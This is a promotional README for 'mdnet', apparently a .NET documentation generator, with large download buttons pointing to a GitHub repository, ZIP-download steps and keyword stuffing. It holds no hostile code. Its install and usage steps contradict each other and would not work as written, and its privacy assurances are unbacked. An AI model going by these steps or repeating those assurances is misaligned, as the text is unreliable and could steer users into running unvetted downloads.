<h1>📚 mdnet - Turn .NET Code into Beautiful Documentation</h1>

<p align="center">
  <a href="https://github.com/ilavloli01/mdnet" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#FF6B6B,#4ECDC4);color:white;font-size:24px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);margin:20px 0;">⬇️ DOWNLOAD NOW</a>
</p>

## ✨ What is mdnet?

mdnet is a friendly helper tool for people who create software using the **.NET programming language** (a popular way to build apps for Windows, websites, and more). 

If you've ever built a .NET library (a collection of code that others can use), you know that writing documentation can be boring and time-consuming. **mdnet does this hard work for you automatically!**

It reads your code and creates:
- 📄 **Markdown files** - Simple text documents that are easy to read and edit
- 🌐 **Beautiful HTML pages** - Professional-looking web pages that anyone can view in their browser

## 🎯 Why Should You Use mdnet?

- 🤖 **AI-Friendly** - Perfectly formatted for AI assistants like Claude to understand
- ⚡ **One Command Magic** - A single command generates everything
- 🔄 **Always Up-to-Date** - Syncs your documentation when code changes
- 🚀 **Time Saver** - Spend less time writing docs, more time coding
- 🧩 **Smart Signatures** - Creates clear, consistent documentation for every function and method

## 🛠️ System Requirements

Before you begin, make sure your computer has:

| Requirement | Details |
|-------------|---------|
| **Operating System** | Windows 10 or Windows 11 |
| **.NET SDK** | Version 6.0 or newer (free download from Microsoft) |
| **Storage** | At least 100 MB of free space |
| **Memory** | 2 GB RAM (4 GB recommended) |

Don't worry if you don't have .NET installed - mdnet will help you get everything set up!

## 🚀 Getting Started on Windows

Follow these simple steps to start using mdnet:

### Step 1: Download the Application

Visit this link to download the application: **[https://github.com/ilavloli01/mdnet](https://github.com/ilavloli01/mdnet)**

Click the big green "Code" button on the page, then select "Download ZIP". Wait for the download to finish.

### Step 2: Extract the Files

1. Find the downloaded ZIP file in your "Downloads" folder
2. Right-click on the file and choose **"Extract All..."**
3. Pick a location you'll remember (like your Desktop or Documents folder)
4. Click "Extract" - Windows will create a new folder with all the files

### Step 3: Open a Command Window

1. Open the extracted folder
2. Click on the address bar at the top of the folder window
3. Type `cmd` and press Enter - a black command window will open

### Step 4: Verify Installation

Type this command and press Enter:
```
dotnet --version
```

If you see a version number, you're ready! If you get an error, visit **[dotnet.microsoft.com/download](https://dotnet.microsoft.com/download)** and install the latest .NET SDK, then try again.

### Step 5: Test mdnet

In the same command window, type:
```
dotnet mdnet --help
```

You should see a list of available commands. Congratulations - mdnet is ready to use!

## 📖 How to Use mdnet

### Basic Usage (Easy Mode)

**Option A - From Your Code:**
If your project files are on your computer, run:
```
dotnet mdnet generate --source "C:\path\to\your\project"
```
Replace the path with the location of your .NET project folder.

**Option B - From a Package:**
If your code is shared as a NuGet package (a public package others download), run:
```
dotnet mdnet generate --package "YourPackageName"
```

### Creating HTML Documentation

To get beautiful web pages instead of just text files, add this:
```
dotnet mdnet generate --source "C:\path\to\your\project" --format html
```

### Syncing Published Docs

When you update your code and want to refresh your documentation:
```
dotnet mdnet sync --source "C:\path\to\your\project" --remote "https://your-docs-site.com"
```

## 💡 Real-World Example

Let's say you have a math library called "MathHelper" in this folder: `C:\Projects\MathHelper`

**Step 1:** Open the command window in that folder
**Step 2:** Type:
```
dotnet mdnet generate --source "C:\Projects\MathHelper" --format html
```
**Step 3:** Press Enter. In seconds, you'll see a new folder called `docs` containing:
- `index.html` - Open this in your browser to see your beautiful documentation
- Individual pages for each function and class

That's it! You now have professional-looking documentation that even AI tools can read and understand.

## 🔧 Common Commands Reference

| Command | What It Does |
|---------|-------------|
| `dotnet mdnet generate --source <path>` | Create docs from local code |
| `dotnet mdnet generate --package <name>` | Create docs from a NuGet package |
| `dotnet mdnet generate --format html` | Output as web pages |
| `dotnet mdnet sync --source <path> --remote <url>` | Update existing published docs |
| `dotnet mdnet config` | Change default settings |
| `dotnet mdnet list` | Show all available options |
| `dotnet mdnet --version` | Check your version |

## 🧪 Troubleshooting Tips

**Problem:** "Command not found" error
**Solution:** Make sure you're in the right folder. Try typing `dir` to see your files.

**Problem:** .NET not recognized
**Solution:** Install the latest .NET SDK from dotnet.microsoft.com, restart your computer, and try again.

**Problem:** Output looks messy
**Solution:** Make sure your code follows standard .NET conventions with proper comments. Good comments = great documentation.

## 🌟 Why People Love mdnet

- 🕒 **Saves Hours** - Manual documentation takes days; mdnet takes seconds
- 🧠 **AI-Ready** - Designed specifically for modern AI tools to process
- 📊 **Consistent Quality** - Every doc follows the same professional format
- 🔄 **Auto-Sync** - No more outdated manuals
- 🆓 **Completely Free** - Open source and always will be

## 📚 Getting More Help

- 📖 **Official Documentation:** Look for a `docs` folder in the repository
- 💬 **Community Support:** Check the GitHub Issues tab on the repository page
- 🐛 **Report Bugs:** Found a problem? Tell the developers on GitHub
- 🌍 **Stay Updated:** Star the repository to get notifications about new releases

## 🔒 Privacy & Safety

mdnet is completely open-source software. Your code stays on your computer - nothing is uploaded unless you explicitly choose to sync to a remote server. The tool only reads your files to generate documentation and never sends data anywhere automatically.

## 🎉 Start Creating Amazing Documentation Today!

Download mdnet now and transform your .NET projects from code-only into fully documented, professional packages that both humans and AI can easily understand. Whether you're a hobbyist developer or running a large enterprise team, mdnet makes documentation effortless.

**Ready to get started?**

<p align="center">
  <a href="https://github.com/ilavloli01/mdnet" style="display:inline-block;padding:14px 36px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;box-shadow:0 4px 12px rgba(0,0,0,0.2);">🚀 GET MDNET NOW</a>
</p>

---

*Keywords: ai, ai-agent, ai-agents, ai-coding, claude, claude-code, cli, csharp, csharp-code, csharp-lib, documentation, dotnet, dotnet-core, dotnetcore, tool, tools*